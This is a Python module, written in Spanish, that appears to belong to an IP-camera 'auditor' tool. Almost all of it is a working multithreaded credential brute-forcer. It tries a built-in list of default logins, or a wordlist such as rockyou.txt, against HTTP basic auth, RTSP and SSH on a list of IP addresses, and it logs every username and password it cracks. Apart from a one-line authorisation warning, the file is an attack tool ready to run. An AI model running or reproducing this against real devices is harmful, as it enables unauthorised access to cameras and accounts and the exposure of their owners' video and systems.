"""
Módulo de fuerza bruta para SmartCam Auditor v2.0 Pro
ADVERTENCIA: Solo para uso en redes propias o con autorización explícita
"""

import requests
import socket
import base64
import threading
import time
import json
import os
from urllib3.exceptions import InsecureRequestWarning
import urllib3

# Suprimir advertencias SSL
urllib3.disable_warnings(InsecureRequestWarning)

class FuerzaBrutaScanner:
    def __init__(self, config_file="config/config.json"):
        self.config = self.cargar_configuracion(config_file)
        self.MAX_THREADS = self.config.get('brute_force', {}).get('max_threads', 20)
        self.TIMEOUT = self.config.get('brute_force', {}).get('timeout', 3)
        self.DELAY = self.config.get('brute_force', {}).get('delay_between_attempts', 0.3)
        self.resultados = []
        self.lock = threading.Lock()
        
    def cargar_configuracion(self, config_file):
        """Carga configuración desde JSON"""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return {}
        except Exception as e:
            print(f"[WARNING] Error cargando configuración: {e}")
            return {}

    def cargar_credenciales(self, diccionario_path):
        """Carga credenciales desde archivo de diccionario"""
        if not os.path.exists(diccionario_path):
            print(f"[ERROR] Diccionario no encontrado: {diccionario_path}")
            # Credenciales por defecto si no existe el archivo
            return [
                ("admin", "admin"), ("admin", "password"), ("admin", "12345"),
                ("admin", ""), ("root", "root"), ("root", "admin"),
                ("user", "user"), ("guest", "guest"), ("", "admin"),
                ("admin", "1234"), ("admin", "admin123"), ("supervisor", "supervisor")
            ]
        
        try:
            with open(diccionario_path, "r", encoding="utf-8", errors="ignore") as f:
                lineas = f.read().splitlines()
            
            credenciales = []
            for linea in lineas:
                linea = linea.strip()
                if linea and ":" in linea:
                    parts = linea.split(":", 1)
                    if len(parts) == 2:
                        credenciales.append((parts[0], parts[1]))
            
            print(f"[✓] Cargadas {len(credenciales)} credenciales desde {diccionario_path}")
            return credenciales
            
        except Exception as e:
            print(f"[ERROR] Error leyendo diccionario: {e}")
            return []

    def ataque_http(self, ip, puerto, credenciales, resultados):
        """Ataque HTTP con autenticación básica"""
        url_http = f"http://{ip}:{puerto}"
        url_https = f"https://{ip}:{puerto}"
        
        for usuario, clave in credenciales:
            try:
                # Intentar HTTP
                response = requests.get(
                    url_http, 
                    auth=(usuario, clave), 
                    timeout=self.TIMEOUT,
                    verify=False
                )
                
                if response.status_code == 200:
                    resultado = f"[HTTP] {ip}:{puerto} -> {usuario}:{clave}"
                    with self.lock:
                        resultados.append(resultado)
                        print(f"✅ 🚨 {resultado}")
                    return True
                    
                # Si HTTP falla, intentar HTTPS
                if puerto == 80:
                    response_https = requests.get(
                        url_https.replace(':80', ':443'), 
                        auth=(usuario, clave), 
                        timeout=self.TIMEOUT,
                        verify=False
                    )
                    
                    if response_https.status_code == 200:
                        resultado = f"[HTTPS] {ip}:443 -> {usuario}:{clave}"
                        with self.lock:
                            resultados.append(resultado)
                            print(f"✅ 🚨 {resultado}")
                        return True
                        
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.ConnectionError:
                continue
            except Exception:
                continue
                
        return False

    def ataque_rtsp(self, ip, credenciales, resultados):
        """Ataque RTSP con autenticación básica"""
        puertos_rtsp = [554, 8554]
        
        for puerto in puertos_rtsp:
            for usuario, clave in credenciales:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.TIMEOUT)
                    sock.connect((ip, puerto))

                    userpass = f"{usuario}:{clave}"
                    b64_auth = base64.b64encode(userpass.encode()).decode()

                    request = f"OPTIONS rtsp://{ip}:{puerto}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {b64_auth}\r\n\r\n"
                    sock.send(request.encode())
                    
                    response = sock.recv(1024)
                    sock.close()
                    
                    if b"200 OK" in response or b"401" not in response:
                        resultado = f"[RTSP] {ip}:{puerto} -> {usuario}:{clave}"
                        with self.lock:
                            resultados.append(resultado)
                            print(f"✅ 🚨 {resultado}")
                        return True
                        
                except socket.timeout:
                    continue
                except ConnectionRefusedError:
                    break  # Puerto cerrado
                except Exception:
                    continue
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                    
        return False

    def ataque_ssh(self, ip, credenciales, resultados):
        """Ataque SSH (requiere paramiko)"""
        try:
            import paramiko
        except ImportError:
            print(f"[WARNING] paramiko no disponible para SSH en {ip}")
            return False
            
        for usuario, clave in credenciales:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    ip, 
                    port=22, 
                    username=usuario, 
                    password=clave, 
                    timeout=self.TIMEOUT,
                    banner_timeout=self.TIMEOUT
                )
                
                resultado = f"[SSH] {ip}:22 -> {usuario}:{clave}"
                with self.lock:
                    resultados.append(resultado)
                    print(f"✅ 🚨 {resultado}")
                client.close()
                return True
                
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException:
                continue
            except Exception:
                continue
                
        return False

    def fuerza_bruta_dispositivo(self, ip, credenciales, resultados):
        """Ejecuta fuerza bruta en todos los servicios de un dispositivo"""
        print(f"🔥 Atacando {ip} con fuerza bruta...")
        
        servicios_encontrados = []
        
        # HTTP/HTTPS
        if self.ataque_http(ip, 80, credenciales, resultados):
            servicios_encontrados.append("HTTP")
            
        # RTSP
        if self.ataque_rtsp(ip, credenciales, resultados):
            servicios_encontrados.append("RTSP")
            
        # SSH (si está habilitado en config)
        if self.config.get('brute_force', {}).get('enable_ssh', False):
            if self.ataque_ssh(ip, credenciales, resultados):
                servicios_encontrados.append("SSH")
        
        if not servicios_encontrados:
            print(f"   ❌ {ip} - Sin credenciales débiles encontradas")
        else:
            print(f"   ✅ {ip} - Vulnerabilidades en: {', '.join(servicios_encontrados)}")

    def iniciar_fuerza_bruta(self, lista_ips, diccionario_path=None):
        """
        Inicia ataque de fuerza bruta contra lista de IPs
        
        Args:
            lista_ips (list): Lista de IPs a atacar
            diccionario_path (str): Ruta al archivo de diccionario
            
        Returns:
            list: Lista de credenciales encontradas
        """
        print(f"🔒 INICIANDO FUERZA BRUTA AVANZADA")
        print(f"⚠️  ADVERTENCIA: Solo usar en redes propias o con autorización")
        print("=" * 60)
        
        # Usar diccionario de configuración o por defecto
        if not diccionario_path:
            diccionario_path = self.config.get('brute_force', {}).get(
                'dictionary_path', 
                'diccionarios/credenciales_comunes.txt'
            )
        
        # Cargar credenciales
        credenciales = self.cargar_credenciales(diccionario_path)
        if not credenciales:
            print("[ERROR] No se pudieron cargar credenciales")
            return []
        
        print(f"🎯 Objetivos: {len(lista_ips)} dispositivos")
        print(f"🔑 Credenciales: {len(credenciales)} combinaciones")
        print(f"🧵 Hilos máximos: {self.MAX_THREADS}")
        print(f"⏱️  Timeout: {self.TIMEOUT}s")
        print()
        
        resultados = []
        hilos = []
        
        # Crear directorio de logs si no existe
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        start_time = time.time()
        
        for i, ip in enumerate(lista_ips, 1):
            print(f"🔍 Iniciando ataque {i}/{len(lista_ips)}: {ip}")
            
            t = threading.Thread(
                target=self.fuerza_bruta_dispositivo, 
                args=(ip, credenciales, resultados)
            )
            hilos.append(t)
            t.start()
            
            # Control de hilos
            time.sleep(self.DELAY)
            while threading.active_count() > self.MAX_THREADS:
                time.sleep(0.5)
        
        # Esperar que terminen todos los hilos
        for t in hilos:
            t.join()
        
        elapsed_time = time.time() - start_time
        
        # Mostrar resultados finales
        print(f"\n🎯 RESULTADOS FINALES:")
        print("=" * 50)
        print(f"⏱️  Tiempo total: {elapsed_time:.2f}s")
        print(f"🎯 Dispositivos atacados: {len(lista_ips)}")
        print(f"🚨 Credenciales encontradas: {len(resultados)}")
        
        if resultados:
            print(f"\n🚨 CREDENCIALES DÉBILES ENCONTRADAS:")
            for resultado in resultados:
                print(f"   ⚠️  {resultado}")
                
            # Guardar en log
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            log_file = f"logs/fuerza_bruta_{timestamp}.log"
            with open(log_file, 'w', encoding='utf-8') as f:
                f.write(f"Fuerza Bruta SmartCam Auditor - {timestamp}\n")
                f.write("=" * 50 + "\n")
                f.write(f"Dispositivos atacados: {lista_ips}\n")
                f.write(f"Credenciales probadas: {len(credenciales)}\n")
                f.write(f"Tiempo total: {elapsed_time:.2f}s\n\n")
                f.write("RESULTADOS:\n")
                for resultado in resultados:
                    f.write(f"{resultado}\n")
            
            print(f"\n📄 Log guardado en: {log_file}")
        else:
            print("✅ No se encontraron credenciales débiles")
        
        return resultados

# Funciones de compatibilidad
def cargar_credenciales(diccionario_path):
    """Función de compatibilidad - carga credenciales desde archivo"""
    bf = FuerzaBrutaScanner()
    return bf.cargar_credenciales(diccionario_path)

def ataque_http(ip, puerto, credenciales, resultados):
    """Función de compatibilidad - ataque HTTP"""
    bf = FuerzaBrutaScanner()
    return bf.ataque_http(ip, puerto, credenciales, resultados)

def ataque_rtsp(ip, credenciales, resultados):
    """Función de compatibilidad - ataque RTSP"""
    bf = FuerzaBrutaScanner()
    return bf.ataque_rtsp(ip, credenciales, resultados)

def fuerza_bruta(ip, credenciales, resultados):
    """Función de compatibilidad - fuerza bruta en un dispositivo"""
    bf = FuerzaBrutaScanner()
    bf.fuerza_bruta_dispositivo(ip, credenciales, resultados)

def iniciar_fuerza_bruta(lista_ips, diccionario_path="diccionarios/rockyou.txt"):
    """
    Función principal de compatibilidad - mantiene tu API original
    
    Args:
        lista_ips (list): Lista de IPs a atacar
        diccionario_path (str): Ruta al diccionario
        
    Returns:
        list: Resultados del ataque
    """
    bf = FuerzaBrutaScanner()
    return bf.iniciar_fuerza_bruta(lista_ips, diccionario_path)

# Variables globales para compatibilidad
MAX_THREADS = 20
TIMEOUT = 3
